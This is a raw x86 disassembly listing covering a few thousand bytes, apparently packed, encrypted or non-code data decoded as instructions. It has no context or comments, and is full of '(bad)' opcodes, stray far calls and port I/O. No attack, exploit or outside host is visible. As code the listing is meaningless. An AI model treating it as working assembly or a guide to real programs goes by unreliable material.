  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx+0x1ed2136]
  41b92f:	outs   dx,DWORD PTR ds:[esi]
  41b930:	pop    ss
  41b931:	lock out 0x7f,al
  41b934:	js     0x41b946
  41b936:	jle    0x41b9b0
  41b938:	js     0x41b8f6
  41b93a:	xor    bh,BYTE PTR [ebx]
  41b93c:	in     eax,dx
  41b93d:	in     al,0xa3
  41b93f:	in     al,dx
  41b940:	cld    
  41b941:	dec    ebp
  41b942:	inc    eax
  41b943:	mov    ebx,0xbc07f15a
  41b948:	or     bh,ah
  41b94a:	out    dx,al
  41b94b:	xrelease mov DWORD PTR [esi+0x0],edx
  41b94f:	ss mov ecx,0x3285718e
  41b955:	xor    ebp,DWORD PTR [esi+0x75510e42]
  41b95b:	es inc ebp
  41b95d:	mov    esp,0xd7eb1bc0
  41b962:	fcomp  DWORD PTR [ebp+eax*1-0x6a]
  41b966:	inc    ecx
  41b967:	mov    cl,0x8e
  41b969:	dec    esi
  41b96a:	adc    edi,DWORD PTR [edx-0x3214edea]
  41b970:	xchg   esp,eax
  41b971:	lahf   
  41b972:	mov    edi,0x2c5cdb5d
  41b977:	loopne 0x41b92b
  41b979:	ins    DWORD PTR es:[edi],dx
  41b97a:	or     BYTE PTR [eax-0x42],0xa7
  41b97e:	adc    al,0xd9
  41b980:	(bad)  
  41b981:	div    BYTE PTR [edi-0x70]
  41b984:	push   edx
  41b985:	outs   dx,BYTE PTR ds:[esi]
  41b986:	aam    0x4d
  41b988:	pop    eax
  41b989:	fldcw  WORD PTR [esi+0x17]
  41b98c:	push   esp
  41b98d:	mov    ebp,ss
  41b98f:	jge    0x41b9e8
  41b991:	adc    eax,DWORD PTR [eax*8-0x33f37618]
  41b998:	dec    ebp
  41b999:	xor    dh,0xe2
  41b99c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b99d:	stc    
  41b99e:	shl    DWORD PTR [edi-0x25],0xf1
  41b9a2:	push   esi
  41b9a3:	aas    
  41b9a4:	sbb    bl,BYTE PTR [ebx+0x13f6e626]
  41b9aa:	lods   eax,DWORD PTR ds:[esi]
  41b9ab:	mov    esi,0xb98b5786
  41b9b0:	inc    esp
  41b9b1:	(bad)  
  41b9b2:	mov    esi,0x8460494
  41b9b7:	jle    0x41b988
  41b9b9:	jge    0x41ba04
  41b9bb:	inc    esp
  41b9bc:	shl    esp,1
  41b9be:	pop    ds
  41b9bf:	xchg   DWORD PTR [eax-0x21d5bd29],edx
  41b9c5:	xchg   ebx,eax
  41b9c6:	addr16 push eax
  41b9c8:	xchg   ecx,eax
  41b9c9:	and    ebp,ebp
  41b9cb:	sbb    BYTE PTR [ebx-0x7dcbf955],ah
  41b9d1:	ret    
  41b9d2:	mov    ebx,0x1ae73eb8
  41b9d7:	pop    esi
  41b9d8:	push   ss
  41b9d9:	dec    ecx
  41b9da:	and    BYTE PTR [eax],bh
  41b9dc:	jae    0x41ba16
  41b9de:	dec    bp
  41b9e0:	test   eax,0x169cd303
  41b9e5:	retf   0xef8a
  41b9e8:	jg     0x41b9d3
  41b9ea:	fwait
  41b9eb:	push   ds
  41b9ec:	enter  0xd235,0xff
  41b9f0:	int    0x0
  41b9f2:	add    BYTE PTR [ebp-0x3a],0x3
  41b9f6:	fcom   DWORD PTR [esi+0x1e]
  41b9f9:	cmp    ch,dl
  41b9fb:	jle    0x41ba6d
  41b9fd:	aaa    
  41b9fe:	jno    0x41b980
  41ba00:	push   ecx
  41ba01:	jnp    0x41ba22
  41ba03:	outs   dx,BYTE PTR ds:[esi]
  41ba04:	into   
  41ba05:	push   DWORD PTR [ebx]
  41ba07:	cli    
  41ba08:	mov    ebp,0x185500f1
  41ba0d:	inc    esp
  41ba0e:	mov    esi,0xa8592ac2
  41ba13:	add    dh,BYTE PTR [ebp-0xe789548]
  41ba19:	js     0x41ba07
  41ba1b:	nop
  41ba1c:	jb     0x41b9bd
  41ba1e:	data16 jb 0x41ba12
  41ba21:	sub    edx,DWORD PTR [edx]
  41ba23:	in     al,dx
  41ba24:	or     dh,BYTE PTR [eax-0x3e986b13]
  41ba2a:	shl    BYTE PTR [edx],1
  41ba2c:	mov    edx,0x803c28dd
  41ba31:	inc    edx
  41ba32:	pop    es
  41ba33:	dec    ebx
  41ba34:	jb     0x41b9df
  41ba36:	and    al,0x58
  41ba38:	push   edi
  41ba39:	adc    ecx,eax
  41ba3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba3c:	or     BYTE PTR [esi+0x25436a40],al
  41ba42:	push   edi
  41ba43:	pop    eax
  41ba44:	or     esp,esp
  41ba46:	int    0x9f
  41ba48:	push   cs
  41ba49:	xchg   ebp,eax
  41ba4a:	sbb    edi,DWORD PTR [eax-0x428d2310]
  41ba50:	xor    bl,bh
  41ba52:	sub    al,0x97
  41ba54:	dec    edx
  41ba55:	sub    al,0x30
  41ba57:	and    ch,al
  41ba59:	adc    edx,esi
  41ba5b:	mov    eax,ds:0x96046133
  41ba60:	aam    0xbf
  41ba62:	lahf   
  41ba63:	fwait
  41ba64:	jne    0x41bae1
  41ba66:	je     0x41baa5
  41ba68:	or     al,0x4
  41ba6a:	(bad)  
  41ba6b:	xchg   esp,eax
  41ba6c:	or     ch,BYTE PTR [edi+0x14]
  41ba6f:	mov    eax,ds:0xfaeb7071
  41ba74:	test   al,0x19
  41ba76:	push   0xcbcffeab
  41ba7b:	xor    BYTE PTR [ecx+0x6a],cl
  41ba7e:	retf   
  41ba7f:	xchg   edx,eax
  41ba80:	sub    bl,BYTE PTR ds:0x87763a95
  41ba86:	sar    BYTE PTR [eax+0x71],cl
  41ba89:	add    BYTE PTR [edi+0x2967bac6],bl
  41ba8f:	mov    dh,0x76
  41ba91:	and    bh,BYTE PTR [edi+0x16]
  41ba94:	not    BYTE PTR [eax-0x249df942]
  41ba9a:	or     DWORD PTR [edx-0x32],ebp
  41ba9d:	push   edx
  41ba9e:	jne    0x41bad2
  41baa0:	add    al,0x94
  41baa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baa3:	hlt    
  41baa4:	inc    edi
  41baa5:	adc    eax,0x745bf035
  41baaa:	stc    
  41baab:	(bad)  
  41baac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41baad:	dec    edi
  41baae:	mov    ds:0xfdc37214,eax
  41bab3:	inc    eax
  41bab4:	ret    
  41bab5:	stc    
  41bab6:	xchg   DWORD PTR [ebx-0x4afbbc54],ebx
  41babc:	call   0xe3ae:0x4379b4ca
  41bac3:	jae    0x41ba93
  41bac5:	xchg   ebp,eax
  41bac6:	out    dx,al
  41bac7:	mov    dl,0x79
  41bac9:	arpl   bp,dx
  41bacb:	es loopne 0x41bb21
  41bace:	retf   0x8c81
  41bad1:	fild   DWORD PTR [eax]
  41bad3:	jb     0x41ba5a
  41bad5:	les    edx,FWORD PTR [ebx+ebx*8-0x1f]
  41bad9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bada:	cmp    eax,0x64446cae
  41badf:	mov    eax,0x84633d83
  41bae4:	(bad)  
  41bae5:	add    DWORD PTR [esi+ecx*1+0xf502ba9],ecx
  41baec:	cmp    ebx,DWORD PTR [eax+0x55123b0b]
  41baf2:	int    0xc6
  41baf4:	or     edi,DWORD PTR [ecx]
  41baf6:	aas    
  41baf7:	mov    bl,0x25
  41baf9:	adc    DWORD PTR ds:0x9ab82215,ecx
  41baff:	and    eax,0xdd566808
  41bb04:	xchg   edi,eax
  41bb05:	int3   
  41bb06:	imul   ecx,DWORD PTR [esi],0x48
  41bb09:	and    cl,BYTE PTR [eax]
  41bb0b:	sub    eax,0x6877ac6b
  41bb10:	push   ds
  41bb11:	fs pop eax
  41bb13:	pushf  
  41bb14:	sar    DWORD PTR [eax+0x2e1e90e2],1
  41bb1a:	lock mov ds:0x8e7325ac,eax
  41bb20:	push   ds
  41bb21:	jb     0x41bb8a
  41bb23:	in     al,dx
  41bb24:	mov    BYTE PTR [ebp+0x2fa20ae6],ch
  41bb2a:	retf   0xe537
  41bb2d:	stos   DWORD PTR es:[edi],eax
  41bb2e:	aas    
  41bb2f:	mov    esi,0xa28e2b5e
  41bb34:	push   edx
  41bb35:	ror    dh,0xfc
  41bb38:	jmp    0x15ee:0xac44dbcb
  41bb3f:	push   0x2ac68a70
  41bb44:	adc    bh,BYTE PTR [ecx]
  41bb46:	adc    eax,0xef079f3e
  41bb4b:	adc    ecx,DWORD PTR [edx-0x25ecb4bd]
  41bb51:	xor    edx,ecx
  41bb53:	jmp    0x41bd88
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0x8b17bf12
  41bb65:	cli    
  41bb66:	push   ebp
  41bb67:	sub    ecx,DWORD PTR [eax+0x10787fe4]
  41bb6d:	jle    0x41bbe7
  41bb6f:	js     0x41bb68
  41bb71:	jmp    0x6d1d9cbd
  41bb76:	popa   
  41bb77:	dec    ebx
  41bb78:	fnstcw WORD PTR [ebp-0xd]
  41bb7b:	and    ch,BYTE PTR [edi+0x3d]
  41bb7e:	repz es (bad) 
  41bb81:	pop    eax
  41bb82:	enter  0xbeec,0xc6
  41bb86:	sub    eax,0x23d30dd2
  41bb8b:	sub    al,0x8a
  41bb8d:	leave  
  41bb8e:	push   0x71695fb3
  41bb93:	mov    bh,0x88
  41bb95:	fs mov dl,0xe3
  41bb98:	stc    
  41bb99:	inc    esp
  41bb9a:	mov    eax,ds:0x6980d00e
  41bb9f:	(bad)  
  41bba0:	repnz dec eax
  41bba2:	ret    
  41bba3:	lds    eax,FWORD PTR [ebx-0x5]
  41bba6:	fst    DWORD PTR [ecx+0xc]
  41bba9:	test   DWORD PTR ds:0x24e7083c,esi
  41bbaf:	push   eax
  41bbb0:	dec    edx
  41bbb1:	cmp    BYTE PTR [esp+eax*4+0x6d],0x8b
  41bbb6:	fst    QWORD PTR [ecx+edi*1-0x72faae52]
  41bbbd:	pop    edx
  41bbbe:	add    DWORD PTR ds:0xd5927ef0,edx
  41bbc4:	dec    ecx
  41bbc5:	cli    
  41bbc6:	xchg   ebx,eax
  41bbc7:	mov    esp,0xf0d79f9a
  41bbcc:	xchg   edx,eax
  41bbcd:	push   esi
  41bbce:	inc    ebx
  41bbcf:	addr16 push es
  41bbd1:	sbb    eax,0xf91ea489
  41bbd6:	mov    eax,0xccdda9aa
  41bbdb:	xlat   BYTE PTR ds:[ebx]
  41bbdc:	jae    0x41bb8e
  41bbde:	add    DWORD PTR [ecx-0x6e],edi
  41bbe1:	in     al,0x9c
  41bbe3:	sub    BYTE PTR [ebx],dl
  41bbe5:	call   0x3cdabdaf
  41bbea:	jl     0x41bc6a
  41bbec:	sar    DWORD PTR [esi+0x2b],0xf7
  41bbf0:	add    ecx,DWORD PTR [eax+0x217707d8]
  41bbf6:	mov    al,0x7b
  41bbf8:	pminsw mm1,QWORD PTR [esi+0x0]
  41bbfc:	mov    bl,0xb6
  41bbfe:	push   eax
  41bbff:	jb     0x41bc39
  41bc01:	sub    DWORD PTR [esi+0x465bfbb4],ebp
  41bc07:	arpl   sp,bx
  41bc09:	inc    edi
  41bc0a:	sub    BYTE PTR [edx+0x69],bh
  41bc0d:	dec    esi
  41bc0e:	test   al,0xe8
  41bc10:	xor    edi,DWORD PTR [esi-0xee02069]
  41bc16:	add    DWORD PTR ds:[edx-0x1c],0x74
  41bc1b:	sbb    eax,0xcd896608
  41bc20:	jo     0x41bc91
  41bc22:	mov    dh,0x49
  41bc24:	mov    ecx,0x76fafd65
  41bc29:	inc    esp
  41bc2a:	push   edi
  41bc2b:	fadd   QWORD PTR [edx]
  41bc2d:	adc    eax,ecx
  41bc2f:	fbstp  TBYTE PTR [edi+0x43255a71]
  41bc35:	jge    0x41bbd4
  41bc37:	dec    esi
  41bc38:	scas   al,BYTE PTR es:[edi]
  41bc39:	sub    DWORD PTR [esi+0x20],ecx
  41bc3c:	sti    
  41bc3d:	fwait
  41bc3e:	push   ebp
  41bc3f:	push   eax
  41bc40:	sbb    dh,BYTE PTR [eax+0x4f]
  41bc43:	je     0x41bc75
  41bc45:	loope  0x41bc7e
  41bc47:	ss jp  0x41bcc9
  41bc4a:	mov    esp,0xda4a4b92
  41bc4f:	fdivr  QWORD PTR [edx-0x1698fa26]
  41bc55:	sub    al,0x3d
  41bc57:	rcr    BYTE PTR [ebp+0x65d684b9],1
  41bc5d:	sbb    eax,0x7502e44d
  41bc62:	cs dec esi
  41bc64:	ins    DWORD PTR es:[edi],dx
  41bc65:	inc    esi
  41bc66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc67:	fcomip st,st(7)
  41bc69:	mov    ebx,cs
  41bc6b:	xchg   ebp,eax
  41bc6c:	xchg   ebx,eax
  41bc6d:	je     0x41bc0e
  41bc6f:	imul   DWORD PTR [esi]
  41bc71:	std    
  41bc72:	adc    DWORD PTR [eax+esi*2],0xffffffcf
  41bc76:	add    bl,BYTE PTR [ecx]
  41bc78:	ret    0x1907
  41bc7b:	mov    ebp,0xc0847af6
  41bc80:	dec    ebp
  41bc81:	sbb    ch,BYTE PTR [ebp-0x2ad159c1]
  41bc87:	stos   BYTE PTR es:[edi],al
  41bc88:	cmp    eax,0x49e555de
  41bc8d:	mov    BYTE PTR [edx],bh
  41bc8f:	and    dl,cl
  41bc91:	add    BYTE PTR [esi+0x5],bl
  41bc94:	add    eax,0x56184641
  41bc99:	in     eax,dx
  41bc9a:	xlat   BYTE PTR ds:[ebx]
  41bc9b:	mov    WORD PTR [ebx+0x4a8da062],es
  41bca1:	out    dx,eax
  41bca2:	pop    ebx
  41bca3:	or     esi,ebp
  41bca5:	push   ecx
  41bca6:	out    0x57,eax
  41bca8:	push   edi
  41bca9:	mov    al,0x1
  41bcab:	retf   0xbb1f
  41bcae:	fisttp DWORD PTR [ebp-0x284e166f]
  41bcb4:	xor    bh,BYTE PTR [ebp-0x39]
  41bcb7:	test   DWORD PTR [esi+0x1],esp
  41bcba:	sub    al,0xbb
  41bcbc:	(bad)  
  41bcbd:	stc    
  41bcbe:	inc    esi
  41bcbf:	push   eax
  41bcc0:	popa   
  41bcc1:	loopne 0x41bcbb
  41bcc3:	inc    edi
  41bcc4:	dec    ebp
  41bcc5:	sbb    eax,0xe2f48c89
  41bcca:	es push ebx
  41bccc:	cmp    DWORD PTR [esi],edi
  41bcce:	in     al,dx
  41bccf:	test   DWORD PTR [ecx-0xd2dc134],edx
  41bcd5:	call   0x2d13:0x18b32cfa
  41bcdc:	xor    DWORD PTR [ebx+0x51a01cca],ecx
  41bce2:	inc    esi
  41bce3:	iret   
  41bce4:	dec    ebp
  41bce5:	inc    DWORD PTR [esi]
  41bce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bce8:	and    ebx,DWORD PTR [ebx]
  41bcea:	jmp    0x41bca9
  41bcec:	out    0x0,eax
  41bcee:	xchg   esp,eax
  41bcef:	jns    0x41bce8
  41bcf1:	or     dh,BYTE PTR [ecx]
  41bcf3:	and    al,0xe3
  41bcf5:	les    edi,FWORD PTR [ecx-0x199440a0]
  41bcfb:	jne    0x41bcbc
  41bcfd:	xchg   BYTE PTR [ecx],dl
  41bcff:	inc    ecx
  41bd00:	loope  0x41bccf
  41bd02:	xor    edi,ebp
  41bd04:	out    0x9f,al
  41bd06:	test   al,0xad
  41bd08:	push   0xffffff8c
  41bd0a:	push   edx
  41bd0b:	(bad)  
  41bd0c:	rcr    bh,cl
  41bd0e:	mov    edi,DWORD PTR [esi-0x6e]
  41bd11:	aad    0x89
  41bd13:	dec    ebp
  41bd14:	dec    eax
  41bd15:	pop    ds
  41bd16:	jmp    0x41bd43
  41bd18:	cmp    cl,cl
  41bd1a:	in     eax,dx
  41bd1b:	sbb    ah,BYTE PTR [ecx-0x1a922957]
  41bd21:	dec    edi
  41bd22:	pop    es
  41bd23:	es jl  0x41bcf3
  41bd26:	add    al,bh
  41bd28:	mov    bh,cl
  41bd2a:	xor    ah,dh
  41bd2c:	enter  0xe32d,0x10
  41bd30:	fwait
  41bd31:	jae    0x41bd54
  41bd33:	add    al,0xf0
  41bd35:	in     al,dx
  41bd36:	adc    al,0x2
  41bd38:	shr    dl,0x3e
  41bd3b:	push   0xc1fe0b24
  41bd40:	fdiv   QWORD PTR ds:0x49595a8
  41bd46:	ret    
  41bd47:	retf   0xdbe2
  41bd4a:	or     al,0x9f
  41bd4c:	imul   edi,DWORD PTR [ecx-0x3da6fa36],0x4a
  41bd53:	mov    ebp,0x363426a8
  41bd58:	rcl    eax,0x59
  41bd5b:	xchg   esp,eax
  41bd5c:	jno    0x41bce4
  41bd5e:	jne    0x41bd10
  41bd60:	sbb    al,0x7d
  41bd62:	and    bh,0xd9
  41bd65:	data16 jno 0x41bd0c
  41bd68:	or     DWORD PTR [ebp-0x4386a230],edx
  41bd6e:	jge    0x41bd7c
  41bd70:	mov    bl,0x52
  41bd72:	or     bl,bl
  41bd74:	je     0x41bd53
  41bd76:	jne    0x41bd41
  41bd78:	retf   0x14f6
  41bd7b:	sar    DWORD PTR [ebp+0x2d],cl
  41bd7e:	imul   ebx,edi,0x18
  41bd81:	cmp    eax,0x50f20a15
  41bd86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd87:	call   0x230:0xe9084d8b
  41bd8e:	add    BYTE PTR [eax],al
  41bd90:	into   
  41bd91:	leave  
  41bd92:	leave  
  41bd93:	rcr    ecx,0xc1
  41bd96:	(bad)  
  41bd97:	fldcw  WORD PTR [ebx+0x3e]
  41bd9a:	stc    
  41bd9b:	push   0x1a
  41bd9d:	(bad)  
  41bd9e:	fwait
  41bd9f:	and    eax,0x787feaa0
  41bda4:	adc    BYTE PTR [esi+0x78],bh
  41bda7:	js     0x41bdbe
  41bda9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bdaa:	mov    ah,0xf9
  41bdac:	xor    edx,DWORD PTR [ebp+0xda6d4d4]
  41bdb2:	pop    edi
  41bdb3:	hlt    
  41bdb4:	mov    ebx,0xcfdc662a
  41bdb9:	xchg   esi,eax
  41bdba:	ror    DWORD PTR [eax+0x45],0xdf
  41bdbe:	mov    eax,ds:0x10da0c1c
  41bdc3:	xor    ah,BYTE PTR [esi+ebp*2+0x53400ead]
  41bdca:	jbe    0x41bdce
  41bdcc:	xchg   ebx,eax
  41bdcd:	mov    esi,0xe8589b07
  41bdd2:	add    DWORD PTR [esi],edx
  41bdd4:	(bad)  
  41bdd5:	loop   0x41be0d
  41bdd7:	dec    ecx
  41bdd8:	xchg   ecx,eax
  41bdd9:	mov    ch,0x8c
  41bddb:	in     al,0x8a
  41bddd:	imul   ebp,DWORD PTR [edx],0x296c243b
  41bde3:	adc    ecx,ecx
  41bde5:	cwde   
  41bde6:	shr    BYTE PTR [ecx],cl
  41bde8:	dec    edi
  41bde9:	loopne 0x41bd78
  41bdeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bdec:	xchg   BYTE PTR [eax-0x6ac733a3],bh
  41bdf2:	pop    eax
  41bdf3:	mov    bl,0xc1
  41bdf5:	sar    esp,1
  41bdf7:	mov    dh,0xa9
  41bdf9:	in     eax,dx
  41bdfa:	push   ecx
  41bdfb:	outs   dx,BYTE PTR ss:[esi]
  41bdfd:	out    0xa2,eax
  41bdff:	cwde   
  41be00:	push   eax
  41be01:	mov    edi,0xdc9f6266
  41be06:	xchg   ecx,edx
  41be08:	ret    
  41be09:	xor    ah,ah
  41be0b:	fwait
  41be0c:	or     DWORD PTR [ebp-0x61fb45db],ebp
  41be12:	jne    0x41be1b
  41be14:	xor    eax,0x346247aa
  41be19:	cmc    
  41be1a:	jbe    0x41be90
  41be1c:	xchg   ebx,eax
  41be1d:	push   0x576df9ae
  41be22:	add    BYTE PTR [ebx+0x27146b2b],cl
  41be28:	into   
  41be29:	jbe    0x41be16
  41be2b:	push   cs
  41be2c:	loopne 0x41bdec
  41be2e:	mov    ds:0xa3c071b1,eax
  41be33:	xchg   BYTE PTR [edx+0x7a211ade],bh
  41be39:	jns    0x41beb2
  41be3b:	leave  
  41be3c:	je     0x41bde9
  41be3e:	popf   
  41be3f:	jmp    0xf6c9cc1e
  41be44:	daa    
  41be45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be46:	adc    esp,DWORD PTR [ecx+ebx*4+0x7d57458b]
  41be4d:	in     eax,dx
  41be4e:	or     BYTE PTR [ecx-0x5],0x2a
  41be52:	xor    al,BYTE PTR [edi]
  41be54:	jae    0x41bde9
  41be56:	aam    0xf1
  41be58:	dec    eax
  41be59:	adc    eax,DWORD PTR ds:0xe5d909de
  41be5f:	cwde   
  41be60:	sar    al,cl
  41be62:	jg     0x41bec1
  41be64:	xor    ebx,0xfffffffe
  41be67:	iret   
  41be68:	cmp    dl,BYTE PTR [esi+edi*8+0x7386e7b2]
  41be6f:	xchg   ecx,eax
  41be70:	xlat   BYTE PTR ds:[ebx]
  41be71:	ja     0x41be90
  41be73:	mov    bh,0x40
  41be75:	(bad)  
  41be77:	in     al,dx
  41be78:	dec    esi
  41be79:	add    BYTE PTR [edx-0x7a72448c],bh
  41be7f:	into   
  41be80:	test   DWORD PTR [edx+0x22],0x4b8b14ea
  41be87:	add    dh,BYTE PTR [edx+esi*2-0x7f]
  41be8b:	pushf  
  41be8c:	call   0x1523:0xd3e29027
  41be93:	mov    edi,0x42ae84b6
  41be98:	shl    DWORD PTR [ecx+0x68],0x5
  41be9c:	mov    bh,bl
  41be9e:	cmc    
  41be9f:	cwde   
  41bea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bea1:	mov    edx,0xa2fc6c7b
  41bea6:	mov    ch,0xd8
  41bea8:	ret    
  41bea9:	loope  0x41be4a
  41beab:	xchg   BYTE PTR ds:0xaa1982a2,ah
  41beb1:	(bad)  
  41beb2:	jns    0x41be9a
  41beb4:	add    ch,BYTE PTR [edi]
  41beb6:	rol    cl,cl
  41beb8:	test   ah,dl
  41beba:	or     DWORD PTR ds:0xa5580c44,ebx
  41bec0:	std    
  41bec1:	push   0xffffffce
  41bec3:	mov    dh,0x8e
  41bec5:	nop
  41bec6:	jno    0x41beb8
  41bec8:	dec    edx
  41bec9:	jle    0x41be4d
  41becb:	jbe    0x41bea1
  41becd:	inc    ebp
  41bece:	xchg   esi,eax
  41becf:	inc    DWORD PTR [esi+0x47]
  41bed2:	lods   al,BYTE PTR ds:[esi]
  41bed3:	add    DWORD PTR [ebp-0x4f0d3783],0xe7f16019
  41bedd:	test   al,0xaa
  41bedf:	or     bh,BYTE PTR [ebx-0x28]
  41bee2:	mov    ecx,0x7e385b09
  41bee7:	dec    ecx
  41bee8:	xchg   edx,eax
  41bee9:	mov    esi,0x7c30159
  41beee:	jnp    0x41be97
  41bef0:	inc    ecx
  41bef1:	cdq    
  41bef2:	rcl    BYTE PTR [ebx+0x4165a1e],0x7e
  41bef9:	shr    cl,0x30
  41befc:	pop    ebx
  41befd:	ja     0x41bf35
  41beff:	ins    DWORD PTR es:[edi],dx
  41bf00:	mov    eax,0x3ac3e4ab
  41bf05:	pop    esp
  41bf06:	int3   
  41bf07:	adc    eax,DWORD PTR [eax-0x66]
  41bf0a:	cwde   
  41bf0b:	cmp    DWORD PTR [eax+0x4],ecx
  41bf0e:	fidiv  DWORD PTR [ecx+edi*1-0x57]
  41bf12:	push   edi
  41bf13:	add    eax,0xe08d7cb3
  41bf18:	or     eax,DWORD PTR [esp-0x50571e16]
  41bf1f:	dec    esi
  41bf20:	jns    0x41beca
  41bf22:	inc    esi
  41bf23:	inc    ebx
  41bf24:	les    esi,FWORD PTR [ebp-0x653dd940]
  41bf2a:	ja     0x41bee1
  41bf2c:	call   FWORD PTR ss:[esi+0x74]
  41bf30:	mov    edx,0x348f035a
  41bf35:	pop    ebp
  41bf36:	fst    QWORD PTR ss:[edi]
  41bf39:	push   eax
  41bf3a:	pop    ss
  41bf3b:	add    edi,ebp
  41bf3d:	das    
  41bf3e:	(bad)  
  41bf3f:	fcomip st,st(0)
  41bf41:	mov    ds:0x49d9971f,eax
  41bf46:	cwde   
  41bf47:	scas   al,BYTE PTR es:[edi]
  41bf48:	pop    DWORD PTR [esi+edi*1-0x5ecedaa2]
  41bf4f:	inc    esp
  41bf50:	ss jmp 0xc5c26d1
  41bf56:	inc    edx
  41bf57:	retf   
  41bf58:	cmp    DWORD PTR [eax-0x29],esi
  41bf5b:	xchg   BYTE PTR ds:0xb0238953,bh
  41bf61:	pushf  
  41bf62:	and    bh,BYTE PTR [ecx-0x73]
  41bf65:	cmp    eax,0x18879e85
  41bf6a:	repnz dec esi
  41bf6c:	sahf   
  41bf6d:	idiv   BYTE PTR [ecx+0x681fe17]
  41bf73:	into   
  41bf74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf75:	cld    
  41bf76:	or     DWORD PTR [edi-0x681ae24a],edx
  41bf7c:	sahf   
  41bf7d:	mov    dh,0xad
  41bf7f:	int3   
  41bf80:	pop    edi
  41bf81:	sahf   
  41bf82:	inc    edi
  41bf83:	adc    eax,0x217c65da
  41bf88:	xchg   eax,ecx
  41bf8a:	lahf   
  41bf8b:	pop    ebx
  41bf8c:	sub    ebx,DWORD PTR [edi+0x59784898]
  41bf92:	lods   eax,DWORD PTR ds:[esi]
  41bf93:	adc    BYTE PTR [esi+0x1ce8ddbf],dl
  41bf99:	pop    ss
  41bf9a:	retf   
  41bf9b:	xchg   si,ax
  41bf9d:	lahf   
  41bf9e:	and    al,0x75
  41bfa0:	xor    DWORD PTR [edi+0x7c],0x5d
  41bfa4:	sub    bl,BYTE PTR [esi-0x3bb9ffc6]
  41bfaa:	jmp    0xb85e4ae8
  41bfaf:	sub    edi,DWORD PTR [esi-0x3c7c9207]
  41bfb5:	xchg   ecx,eax
  41bfb6:	dec    edi
  41bfb7:	cld    
  41bfb8:	jmp    0x4000:0x7b0c85ef
  41bfbf:	mov    cs,WORD PTR [ebp+0x72980a8c]
  41bfc5:	xor    al,BYTE PTR [eax]
  41bfc7:	cmp    ecx,eax
  41bfc9:	jne    0x41b45c
  41bfcf:	mov    ebx,esi
  41bfd1:	jmp    0x41bfdb
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	sar    ah,0x98
  41bff2:	test   al,0xb8
  41bff4:	call   0x7e523878
  41bff9:	js     0x41c073
  41bffb:	in     eax,dx
  41bffc:	sub    dh,BYTE PTR [ebp+0x14]
  41bfff:	leave  
  41c000:	ds out dx,eax
  41c002:	push   ecx
  41c003:	(bad)  
  41c004:	repnz fsin 
  41c007:	movd   DWORD PTR [edx-0x39],mm0
  41c00b:	mov    bl,0xa6
  41c00d:	data16 clc 
  41c00f:	push   ebp
  41c010:	inc    eax
  41c011:	mov    cl,BYTE PTR [edi]
  41c013:	push   ebp
  41c014:	in     al,dx
  41c015:	retf   0x77c2
  41c018:	and    edi,DWORD PTR [edx]
  41c01a:	mov    dl,0x43
  41c01c:	push   eax
  41c01d:	lahf   
  41c01e:	ret    0xcfdd
  41c021:	rol    DWORD PTR [esi],1
  41c023:	int3   
  41c024:	rol    BYTE PTR [ebx+0x7988ff47],0xd0
  41c02b:	pop    ss
  41c02c:	and    BYTE PTR [esp+eax*2+0x16],al
  41c030:	jg     0x41c00e
  41c032:	jp     0x41c031
  41c034:	mov    eax,ds:0x7ec915c7
  41c039:	cmp    eax,0xc2753201
  41c03e:	mov    dh,0x79
  41c040:	mov    ch,0xf8
  41c042:	jmp    0x41c07a
  41c044:	mov    bl,al
  41c046:	hlt    
  41c047:	jp     0x41c034
  41c049:	push   0xfffffffe
  41c04b:	(bad)  
  41c04c:	pop    ss
  41c04d:	(bad)
  41c051:	add    ah,dl
  41c053:	inc    edi
  41c054:	or     ebx,esi
  41c056:	ret    0x788d
  41c059:	inc    esp
  41c05a:	retf   
  41c05b:	addr16 xor al,0x0
  41c05e:	daa    
  41c05f:	sub    eax,0xd5e7b1f4
  41c064:	call   0x98d8:0x97606288
  41c06b:	int3   
  41c06c:	push   ecx
  41c06d:	mov    esi,esi
  41c06f:	lock shl BYTE PTR [di+0x13],1
  41c074:	mov    bl,0x28
  41c076:	xchg   esp,eax
  41c077:	es jns 0x41c0b7
  41c07a:	dec    eax
  41c07b:	pop    edx
  41c07c:	push   ds
  41c07d:	mov    al,ds:0xfd225c0d
  41c082:	arpl   WORD PTR [ebx],si
  41c084:	jmp    0x1315:0x7ca6b7cc
  41c08b:	in     al,0x6f
  41c08d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c08e:	in     eax,0x65
  41c090:	bound  ebp,QWORD PTR [ebp+0x4]
  41c093:	push   cs
  41c094:	jnp    0x41c0d5
  41c096:	push   ss
  41c097:	adc    edx,DWORD PTR [ecx]
  41c099:	jb     0x41c081
  41c09b:	dec    esi
  41c09c:	ret    
  41c09d:	pop    ds
  41c09e:	shr    BYTE PTR [ebx-0x7b88b6a5],cl
  41c0a4:	sub    ebx,DWORD PTR [ecx]
  41c0a6:	(bad)  
  41c0a7:	pop    ss
  41c0a8:	int3   
  41c0a9:	mov    al,0x39
  41c0ab:	jno    0x41c0ab
  41c0ad:	mov    bl,0x4d
  41c0af:	dec    eax
  41c0b0:	xchg   esp,eax
